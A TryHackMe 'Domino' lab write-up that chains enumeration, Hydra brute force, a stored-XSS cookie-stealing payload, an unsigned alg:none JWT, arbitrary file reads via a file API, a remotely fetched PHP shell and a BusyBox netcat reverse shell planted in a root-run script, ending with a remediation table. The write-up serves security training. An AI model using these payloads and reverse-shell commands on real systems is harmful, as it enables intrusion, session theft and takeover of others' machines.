---
title: "TryHackMe Domino — Detailed Penetration Testing Write-up"
platform: TryHackMe
room: Domino
type: writeup
status: completed
tags:
  - tryhackme
  - pentest
  - web-enumeration
  - xss
  - jwt
  - lfi
  - privilege-escalation
---
# FOR SCREENSHOTS: [IMAGES](https://dasmarinassti-my.sharepoint.com/:w:/r/personal/dalit_297710_dasmarinas_sti_edu_ph/_layouts/15/Doc.aspx?sourcedoc=%7BAA17C6E0-7243-42FF-AEAD-C56400DD49E7%7D&file=Login%20page.docx&action=default&mobileredirect=true&DefaultItemOpen=1&wdOrigin=APPHOME-WEB.DIRECT%2CAPPHOME-WEB.JUMPBACKIN&wdPreviousSession=5ad1e7e9-53b6-4ab1-b493-a6e547d92303&wdPreviousSessionSrc=AppHomeWeb&ct=1791707664338)


# TryHackMe: Domino — Detailed Penetration Testing Write-up

> **Lab notice:** This write-up documents activity against the authorized TryHackMe Domino room. Use the commands and techniques only in this room or in systems for which you have explicit permission. Target and callback IP addresses in screenshots can change when the lab restarts; replace them with your current values.

## 1. Overview

The objective of this exercise was to enumerate the target web application, discover exposed files and credentials, investigate a support-ticket workflow, test session and JWT authorization controls, obtain an initial shell, and escalate privileges to root.

### Attack path at a glance

1. Scan the target with RustScan and Nmap.
2. Enumerate the login page and team page; collect usernames and email addresses.
3. Discover directories and exposed configuration-related files.
4. Download and decrypt an encrypted configuration file.
5. Test the login form with Hydra using the discovered username list.
6. Investigate a support-ticket page and test for stored cross-site scripting (XSS).
7. Capture a session cookie through the ticket workflow and use it to access restricted functionality.
8. Inspect the user API and identify a JWT validation weakness involving the `alg: none` algorithm.
9. Use the resulting authorization weakness to retrieve application source/configuration files through the file API.
10. Use the exposed information to obtain a shell as `www-data`, switch to `devops`, and escalate to root through a root-run script.

## 2. Reconnaissance with RustScan and Nmap

### Command

```bash
rustscan -b 500 -a 10.48.167.222 --top -- -sC -sV -Pn
```

### What the command does

- `-b 500` sets RustScan's batch size to 500 ports.
- `-a 10.48.167.222` specifies the target host used in this lab run.
- `--top` scans the most common ports.
- `--` passes the remaining options to Nmap.
- `-sC` runs Nmap's default scripts.
- `-sV` attempts to identify service versions.
- `-Pn` skips host discovery and treats the target as online.

The purpose of this first scan is to establish which network services are exposed and identify versions or service behavior that may guide later enumeration. Record the open ports and service details from your own scan rather than assuming they will remain identical between lab sessions.

![RustScan and Nmap results](assets/screenshot-01.png)

## 3. Web application reconnaissance

### 3.1 Login page

I opened the web application in a browser and inspected the login page. This established the main authentication entry point and provided the form that I later tested with the discovered username list.

![Login page](assets/screenshot-02.png)

### 3.2 Team page: username and email discovery

I navigated to the team page and identified usernames and email addresses displayed by the application. This information can help build a targeted username list for authentication testing, but it should be treated as reconnaissance data—not proof that an account exists or is vulnerable.

![Team page showing usernames and emails](assets/screenshot-03.png)

### 3.3 Save the discovered names

I saved the discovered usernames in a local text file using Nano. Keeping one candidate username per line makes the list easier to reuse with tools that accept a username wordlist.

Example:

```bash
nano users.txt
```

I saved the file and checked that the contents were formatted as expected.

![Username list saved in Nano](assets/screenshot-04.png)

### 3.4 Password-reset workflow

I opened the **Forgot Password** page and tested the reset workflow for the `laura.hayes` account. This step was intended to understand how the application responds to a password-reset request and whether its behavior reveals useful information. A reset request alone does not prove an account takeover; any reset behavior should be recorded carefully and verified against the room's intended challenge.

![Forgot-password workflow](assets/screenshot-05.png)

## 4. Directory and file enumeration

### 4.1 Feroxbuster

```bash
feroxbuster -u http://10.48.167.222/ -w /usr/share/wordlists/dirb/common.txt
```

Feroxbuster requests candidate paths from the wordlist and reports paths that receive potentially interesting responses. I used it to discover directories and files that were not linked directly from the visible pages.

Review response codes, content lengths, redirects, and the actual response bodies. A discovered path is a lead to investigate, not automatically a vulnerability.

![Feroxbuster results](assets/screenshot-06.png)

### 4.2 Gobuster and `config.php`

```bash
gobuster dir -u http://10.48.167.222/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,js,txt,zip.bak
```

Gobuster performs directory and file discovery using the supplied wordlist. The `-x` option adds candidate extensions to each word, including PHP, HTML, JavaScript, text, and backup-style names. This scan revealed `config.php`, which became important during later source/configuration review.

![Gobuster results](assets/screenshot-07.png)

### 4.3 Inspect the exposed backup README

I browsed to:

```text
http://10.48.167.222/backup/README.txt
```

The README provided context about the backup area and helped identify the encrypted configuration file for further examination.

![Backup README](assets/screenshot-08.png)

### 4.4 Download `config.enc`

```bash
wget http://10.48.167.222/backup/config.enc
```

This downloaded the encrypted configuration file to the working directory. Downloading the file did not reveal its contents by itself; I needed to inspect the web application’s JavaScript for clues about the encryption key and then decrypt the file.

![Downloading config.enc](assets/screenshot-09.png)

### 4.5 Inspect `app.js`

I opened:

```text
http://10.48.167.222/static/app.js
```

The JavaScript file contained a key-related value that I examined in the browser. Client-side code should be considered public: secrets embedded in JavaScript can be extracted by any visitor and should not be relied on to protect sensitive server-side data.

![Static app.js](assets/screenshot-10.png)

## 5. Decrypting the configuration file

### 5.1 Inspect the key value

The key value found during inspection was:

```text
4e337875734b3379323032342121
```

This is a hexadecimal representation of bytes. It is important to distinguish a key represented as hex from the literal ASCII characters that make up the hex string.

![Hexadecimal key value](assets/screenshot-11.png)

### 5.2 Prepare the AES key

For the decryption attempt, I used this padded hexadecimal value:

```text
4e337875734b33793230323421210000
```

AES-128 uses a 16-byte key. The hex string above represents 16 bytes. Padding a key with extra zero bytes is not a general-purpose way to repair an incorrect key; it is relevant here only because this is the value used in the lab workflow. The key bytes, encryption mode, and padding behavior must match the original encryption process.

![Prepared AES key](assets/screenshot-12.png)

### 5.3 Decrypt with OpenSSL

The command shown in the lab notes was:

```bash
openssl enc -d -aes-128-ecb \
  -in config.enc \
  -out config.decrypted \
  -K 4e337875734b33793230323421210000
```

- `enc -d` selects decryption.
- `-aes-128-ecb` selects AES-128 in ECB mode.
- `-in` identifies the encrypted input.
- `-out` specifies the decrypted output file.
- `-K` supplies the key as hexadecimal bytes.

After running the command, I inspected the output file to confirm whether it contained readable configuration data. ECB mode does not use an initialization vector, but it has security weaknesses and should not be used for new designs. For modern applications, authenticated encryption such as AES-GCM is generally preferable.

![OpenSSL decryption](assets/screenshot-13.png)

## 6. Login testing with Hydra

### Command

```bash
hydra -L users.txt \
  -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt \
  10.48.167.222 http-post-form \
  '/index.php:username=^USER^&password=^PASS^:Invalid credentials.' -I
```

Hydra tested combinations from the username list and password list against the login form.

- `-L users.txt` supplies a list of usernames.
- `-P` supplies a password wordlist.
- `http-post-form` identifies the HTTP POST form module.
- `^USER^` and `^PASS^` are placeholders Hydra replaces with each candidate.
- The final text, `Invalid credentials.`, is the response pattern used to recognize a failed login.
- `-I` tells Hydra to ignore an existing restore file and start without prompting about it.

The form path, parameter names, and failure string must match the target application's actual request. Password guessing can lock accounts or disrupt systems, so it should only be performed within the authorized lab scope.

![Hydra command and results](assets/screenshot-14.png)

### Credentials identified in this lab run

The successful credentials recorded in the notes were:

- **Username:** `sarah.johnson`
- **Password:** `password`

These credentials are specific to this lab instance and should not be reused elsewhere.

![Successful login credentials](assets/screenshot-15.png)

## 7. Support-ticket page and stored XSS investigation

### 7.1 Inspect the support-ticket page

After logging in, I opened the support-ticket page and investigated how tickets were submitted and reviewed. A support ticket that is later viewed by a privileged user can create a stored-XSS risk if submitted content is rendered without safe output encoding.

![Support-ticket page](assets/screenshot-16.png)

### 7.2 Initial callback test

The cookie inspection showed that the session cookie was not marked `HttpOnly`. This flag controls whether JavaScript can read a cookie through browser APIs. Its absence can increase risk when an XSS vulnerability exists, but it does not by itself prove that XSS is exploitable or that a session cookie can be stolen.

The initial payload in the notes was:

```html
<body onload="new Image().src='http://192.168.159.204/?c='+document.cookie;">
```

I started a simple HTTP server to check whether the browser made a callback:

```bash
python -m http.server 80
```

This first listener was useful for confirming an inbound request, but Python's basic static file server is not designed to print arbitrary request headers in a convenient format.

![Cookie flag and initial payload/listener](assets/screenshot-17.png)

### 7.3 Submit the test payload

I submitted the test payload through the support-ticket form and checked whether the application caused a browser to request the callback URL.

![Payload submitted in support ticket](assets/screenshot-18.png)

### 7.4 First callback had no cookie value

The listener received a connection, but the request did not contain the expected cookie data. This was a useful troubleshooting result: it showed that the callback path was reachable, but not that the cookie had been included. Possible causes include payload parsing or sanitization, an unexpected browser execution context, cookie scope or access restrictions, or a mismatch between the callback address and the machine running the listener.

![Callback received without cookie data](assets/screenshot-19.png)

### 7.5 Use a request-inspection listener

I then prepared a small Python HTTP server that prints the request method, path, headers, and any request body. This makes it easier to see exactly what reaches the listener.

```python
from http.server import BaseHTTPRequestHandler, HTTPServer


class Handler(BaseHTTPRequestHandler):
    def _log(self):
        print(f"\n--- {self.command} {self.path} ---")
        print("Headers:")
        for key, value in self.headers.items():
            print(f"  {key}: {value}")

        length = int(self.headers.get("Content-Length", 0))
        if length:
            body = self.rfile.read(length)
            print(f"Body ({length} bytes):")
            print(body.decode("utf-8", errors="replace"))

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"OK\n")

    do_GET = _log
    do_POST = _log
    do_PUT = _log
    do_DELETE = _log
    do_PATCH = _log
    do_HEAD = _log


if __name__ == "__main__":
    port = 80
    print(f"Listening on http://localhost:{port}")
    HTTPServer(("0.0.0.0", port), Handler).serve_forever()
```

Save the code as a Python file and run it in the lab environment with the required privileges to bind to port 80. Binding to a port below 1024 commonly requires elevated privileges on Linux. Only run listeners in a controlled lab and stop them when testing is complete.

![Request-inspection listener code](assets/screenshot-20.png)

### 7.6 Submit a ticket containing the callback URL

I submitted another ticket using a callback URL pointing to my listener, then watched the request-inspection output.

![Ticket containing callback URL](assets/screenshot-21.png)

### 7.7 Session cookie observed

This time, the callback included a session-cookie value in the request. This indicated that the ticket workflow could cause script execution in a browser context that had access to the cookie. In a real application, this would be a serious session-management issue because a stolen session token may let another party act as the affected user until the session expires or is revoked.

Do not publish live session cookies in a public report. Redact them in screenshots and rotate/revoke them where possible.

![Callback containing session cookie](assets/screenshot-22.png)

## 8. Access restricted functionality

### 8.1 Admin page and session manipulation

I opened the admin route:

```text
http://10.48.167.222/admin/
```

I used the browser's developer tools to inspect the session value and test the session behavior within the room. Replacing a session value and refreshing the page resulted in access to the next challenge flag in this lab.

![Admin page and session inspection](assets/screenshot-23.png)

The security lesson is that authorization must be enforced server-side. A client-controlled session value should not be accepted as proof of an administrator role unless it is protected and validated correctly.

### 8.2 View User API

I opened the **View User API** functionality and found another flag. This endpoint was also useful for understanding how the application exposed user information and handled authorization.

![View User API and flag](assets/screenshot-24.png)

## 9. JWT authorization weakness

### 9.1 Inspect the token endpoint

I browsed to:

```text
http://10.48.167.222/api/auth/token.php
```

I examined the endpoint's behavior and how the application issued or validated authentication tokens.

![Token endpoint](assets/screenshot-25.png)

### 9.2 Understand the `alg: none` test

I used [jwt.io](https://www.jwt.io/) to inspect the JWT structure and construct a token for the lab's authorization test. The example token recorded in the notes was:

```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
```

The header decodes to an algorithm value of `none`, and the payload claims the username and role are `admin`. The trailing dot represents an empty signature segment.

A secure JWT implementation must not blindly trust a client-supplied role claim or accept unsigned tokens. The server should explicitly allow only expected signing algorithms, validate signatures, validate claims such as issuer/audience/expiry as appropriate, and derive authorization from trusted server-side identity data.

![JWT inspection and unsigned token](assets/screenshot-26.png)

### 9.3 Send the token to the admin endpoint

I tested the crafted token by modifying the request to the admin endpoint and adding an `Authorization: Bearer` header. In this lab, the server accepted the token, demonstrating an authorization-validation weakness.

![Admin endpoint request with Authorization header](assets/screenshot-27.png)

## 10. Retrieve application files through the file API

### 10.1 Retrieve `config.php`

I used the file API with the crafted token to request the application configuration file. The command from the notes was:

```bash
curl -i \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.' \
  'http://10.48.167.222/api/files.php?name=/var/www/html/config.php' \
  > config.txt
```

The original notes included a hyphen immediately after `Bearer`; the normal HTTP format is `Authorization: Bearer <token>` without that extra hyphen. Use the exact syntax that matches the request accepted by your lab instance.

This endpoint appears to allow a client-controlled file path to be read. If the server does not constrain requested paths to an approved directory, this can become an arbitrary-file-read or path-traversal vulnerability. The impact depends on what the web process can read.

![Requesting config.php through the file API](assets/screenshot-28.png)

### 10.2 Extract the content field with `jq`

The notes used:

```bash
jq -r ".content" config.txt > config.php
```

This extracts the JSON field named `content` and writes it to `config.php`. If the response includes HTTP headers or is not valid JSON, first separate the response body from headers and verify the JSON structure. Avoid overwriting a useful file before checking the output.

![Extracting config.php content with jq](assets/screenshot-29.png)

![Resulting configuration file](assets/screenshot-30.png)

### 10.3 Retrieve `auth.php`

I used the same file API to retrieve `auth.php`:

```bash
curl -i \
  -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.' \
  'http://10.48.167.222/api/files.php?name=/var/www/html/auth.php' \
  > auth.txt
```

**Important:** Reuse the exact token string that worked in your terminal/browser. If copying from screenshots, watch for accidental Unicode characters or transcription errors in the token. Verify the response before assuming the file was retrieved successfully.

![Requesting auth.php through the file API](assets/screenshot-31.png)

### 10.4 Review the recovered application information

With the recovered files, I reviewed the application configuration and authentication logic. The configuration information was relevant to the next privilege-escalation step. In a professional report, redact passwords, secret keys, database connection strings, and tokens rather than publishing them in full.

![Recovered database/configuration information](assets/screenshot-32.png)

## 11. Obtain an initial shell as `www-data`

### 11.1 Prepare a listener

I first downloaded and launched Penelope:

```bash
wget -q https://raw.githubusercontent.com/brightio/penelope/refs/heads/main/penelope.py
python3 penelope.py
```

Penelope is a shell handler that can manage incoming connections. Verify third-party scripts before running them, and use only the copy needed for the authorized exercise.

I then created a PHP payload named `shell.php` and served it from my machine so the target could request it during the lab's file-API test.

![Penelope and payload preparation](assets/screenshot-33.png)

### 11.2 Trigger the file API request

I changed the request to point the file API at the PHP payload hosted by my machine:

```text
http://10.48.167.222/api/files.php?name=http://192.168.159.204:8000/shell.php
```

This tested whether the endpoint fetched or processed a remote resource based on the supplied `name` parameter. When a server retrieves a user-supplied URL, it may be vulnerable to server-side request forgery (SSRF); if the fetched content is interpreted or executed unsafely, the impact can be more severe. The precise root cause should be confirmed from the endpoint's implementation and observed behavior.

![Modified request pointing to shell.php](assets/screenshot-34.png)

### 11.3 Shell as `www-data`

The callback succeeded and provided a shell running as `www-data`, the web server account. This is initial access, not root access. The account's permissions and accessible files determine the next steps.

![Initial shell as www-data](assets/screenshot-35.png)

## 12. Privilege escalation to `devops`

### 12.1 Switch user

The recovered configuration disclosed a password used by the `devops` account in this lab. From the `www-data` shell, I attempted to switch users:

```bash
su devops
```

I entered the lab credential found during the configuration review and confirmed that the shell changed to `devops`.

Do not include real credentials in a public report. For a portfolio version, replace them with `[REDACTED — lab credential]` unless the room explicitly publishes the credential as part of its walkthrough.

![Switching from www-data to devops](assets/screenshot-36.png)

### 12.2 Retrieve the `devops` flag

After obtaining the `devops` shell, I located and read the flag for that stage of the room.

![Flag retrieved as devops](assets/screenshot-37.png)

### 12.3 Locate another flag under `/opt`

I also searched the `/opt` directory and found another flag. This reinforced the importance of checking common application and operations directories when working through a permitted post-exploitation lab.

![Flag found under /opt](assets/screenshot-38.png)

## 13. Privilege escalation from `devops` to root

### 13.1 Run `pspy` to observe processes

I used `pspy` to monitor processes without requiring root privileges. Process-monitoring tools can reveal scheduled jobs or scripts that run periodically and may execute with a higher privilege level.

![pspy process monitoring](assets/screenshot-39.png)

### 13.2 Identify the root-run health script

The process output revealed a script named `health_report.sh` being run by root. A root-run script becomes a privilege-escalation opportunity if a lower-privileged user can modify the script or influence files/commands it executes. The critical verification is the script's ownership, permissions, directory permissions, and execution context.

![Root-run health_report.sh identified](assets/screenshot-40.png)

### 13.3 Modify the script for the lab callback

In the lab, I inserted the following BusyBox reverse-shell command into the script:

```bash
busybox nc 192.168.135.32 4446 -e sh
```

I then waited for the root-run scheduled task to execute. This command depends on the BusyBox `nc` implementation supporting `-e`, and the callback address and port must be reachable from the target. The IP shown is the address from this recorded lab session; update it to the correct callback IP for your current environment.

![BusyBox callback command in health_report.sh](assets/screenshot-41.png)

### 13.4 Receive the root shell

I started Penelope listening on port `4446` and waited for the scheduled script to connect back. The connection returned a shell with root privileges.

![Root callback received in Penelope](assets/screenshot-42.png)

### 13.5 Retrieve the root flag

After verifying the shell's identity, I read the final root flag and completed the room.

![Root flag](assets/screenshot-43.png)

## 14. Findings and security lessons

| Finding | Evidence from the lab | Security impact | Recommended remediation |
|---|---|---|---|
| Exposed backup/configuration files | Public backup README and encrypted configuration file | May reveal implementation details or expose secrets if encryption is weak or keys are disclosed | Remove backup files from the web root; deny direct access to backups; store secrets outside the document root |
| Encryption key exposed in client-side JavaScript | Key-related value in `static/app.js` | Anyone can inspect public JavaScript and recover embedded secrets | Never embed encryption keys or server secrets in client-side code; use managed server-side secret storage |
| Weak login credentials | Hydra identified a weak password for a lab account | Account takeover risk | Enforce strong passwords, rate limiting, MFA where appropriate, breached-password checks, and monitoring |
| Stored XSS in support-ticket workflow | Submitted content triggered browser-side execution in a reviewer context | An attacker may act in the context of a victim's session or access page data | Apply context-aware output encoding, sanitize HTML with a strict allowlist when rich text is required, and use a restrictive Content Security Policy |
| Session cookie not marked `HttpOnly` | Cookie was accessible to client-side JavaScript during the lab | Increases the impact of XSS by making cookie theft easier | Set `HttpOnly`, `Secure`, and appropriate `SameSite` attributes; rotate session IDs after authentication and privilege changes |
| Inadequate session/role validation | Client-side session manipulation reached restricted functionality | Unauthorized access if the server trusts client-controlled state | Keep authorization decisions server-side; use opaque, unpredictable session IDs and validate them against server-side session state |
| JWT accepted with `alg: none` | Unsigned admin-claim token accepted during testing | Privilege escalation to administrator | Reject unsigned tokens; allowlist signing algorithms; verify signatures and validate issuer, audience, expiry, and required claims |
| Arbitrary file read / unsafe file API | API returned application files based on a user-controlled path | Exposure of source code, configuration, credentials, and other readable files | Use an allowlist of file identifiers; canonicalize and constrain paths; prevent path traversal; do not accept arbitrary remote URLs |
| Remote resource handling in file API | Supplying a URL led to a callback and initial shell in the lab | Potential SSRF or unsafe content handling, with possible code execution depending on implementation | Do not fetch arbitrary user-supplied URLs; restrict outbound traffic; validate schemes and destinations; never execute fetched content |
| Writable root-run script | `health_report.sh` ran as root and was modifiable in the lab | Root compromise | Make root-owned scripts and parent directories writable only by trusted administrators; use absolute command paths and safe environments; audit scheduled tasks |

## 15. Conclusion

This room demonstrated how several weaknesses can chain together: information disclosure supports username discovery; weak authentication provides an account foothold; a support-ticket XSS issue exposes session data; weak JWT validation and an unsafe file API expose application internals; and a writable root-run script enables privilege escalation.

The main lesson is to assess vulnerabilities both individually and as a chain. A single misconfiguration may appear limited, but combined with exposed secrets, weak authorization, and unsafe scheduled tasks, it can lead from unauthenticated reconnaissance to root-level access.

## 16. References

1. TryHackMe — [Domino room](https://tryhackme.com/room/domino)
2. Community write-up — [Domino scenario](https://0xb0b.gitbook.io/writeups/tryhackme/2026/domino#scenario)
3. YouTube walkthrough — [Domino room video](https://www.youtube.com/watch?v=j1YuWAfxG10)
4. JWT debugging tool — [jwt.io](https://www.jwt.io/)

---

## Screenshot notes

The screenshots in this write-up are linked from the sibling `assets/` folder. Keep that folder next to this Markdown file when moving the write-up into Obsidian or GitHub. Review every screenshot before publishing and redact session cookies, credentials, tokens, and any sensitive values.
